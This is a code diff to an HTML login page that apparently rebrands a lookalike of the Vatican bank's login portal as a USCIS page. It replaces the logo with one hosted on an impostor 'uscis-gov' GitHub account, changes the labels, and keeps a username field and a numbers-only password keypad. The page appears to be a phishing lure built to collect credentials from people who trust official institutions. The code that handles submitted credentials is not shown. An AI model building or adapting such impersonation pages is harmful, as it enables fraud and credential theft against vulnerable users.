@@ -61,7 +61,7 @@
         }
 
         .login-box {
-            background-color: #A99F78;
+            background-color: #5499C7;
             color: #fff;
             padding: 10px;
             margin-bottom: 10px;
@@ -96,7 +96,7 @@
         }
 
         .footer {
-            background-color: #A99F78;
+            background-color: #5499C7;
             color: #fff;
             padding: 20px;
             text-align: center;
@@ -104,7 +104,7 @@
         }
 
         button[type="submit"] {
-            background-color: #A99F78;
+            background-color: #6CF685;
             color: #FFFFFF;
         }
 
@@ -133,7 +133,7 @@
 <body>
 
 <div class="header">
-    <img src="https://www.ior.va/content/ior/en/_jcr_content/logo.img.png/1591622139280.png" alt="Logo" class="logo">
+    <img src="https://raw.githubusercontent.com/uscis-gov/uscis/main/uscis.jpg" alt="Logo" class="logo">
     <div class="datetime">
         <span id="currentDateTime"></span>
     </div>
@@ -141,10 +141,10 @@
 
 <div class="login-section">
     <div class="left-section">
-        <div class="login-box">utente</div>
-        <input type="text" placeholder="Inserisci il tuo nome utente" id="usernameInput" aria-label="Usuario">
-        <div class="login-box">Contraseña (solo números)</div>
-        <input type="password" placeholder="inserisci la tua password (solo numeri)" id="passwordInput" aria-label="password (solo numeri)">
+        <div class="login-box">users</div>
+        <input type="text" placeholder="insert user" id="usernameInput" aria-label="Usuario">
+        <div class="login-box">pasword (numbers only)</div>
+        <input type="password" placeholder="insert password" id="passwordInput" aria-label="password (numbers only)">
         <div class="keyboard">
             <button onclick="appendNumber(1)">1</button>
             <button onclick="appendNumber(2)">2</button>
@@ -158,8 +158,8 @@
         </div>
         <button type="submit" id="continueButton">Continuar</button>
         <div>
-            <a href="#">Hai dimenticato il tuo nome utente</a><br>
-            <a href="#">problemi di connessione?</a>
+            <a href="#">a olvidado su usuario</a><br>
+            <a href="#">problemas de conexion</a>
         </div>
     </div>
     <div class="right-section">
@@ -173,7 +173,7 @@
 </div>
 
 <div class="footer">
-    informazioni di contatto sede vaticana: roma 60 1 343 00 00 - venezi  60 4 510 90 00 - vatizi 1800-653-569 filiali telefoniche: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.
+    contact info: roma 60 1 343 00 00 - venezi  60 4 510 90 00 - vatizi 1800-653-569 filiali telefoniche: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.
 </div>
 
 <script>
@@ -242,7 +242,7 @@
     const imageInfo = [
         { src: "https://imagenes.eltiempo.com/files/image_1200_600/uploads/2024/01/03/659593e3a8bcf.png", link: "https://www.uscis.gov/es", text: "Texto_de_la_imagen_1" },
         { src: "https://www.hstoday.us/wp-content/uploads/2023/10/uscistable-696x554.jpeg", link: "https://www.uscis.gov/es", text: "Texto_de_la_imagen_2" },
-        { src: "https://raw.githubusercontent.com/vaticanoorg/vaticanoior/main/vcb1.jpg", link: "https://www.uscis.gov/es", text: "Texto_de_la_imagen_3" }
+        { src: "uscis2.jpg", link: "https://www.uscis.gov/es", text: "Texto_de_la_imagen_3" }
     ];
 
     function showNextImage() {
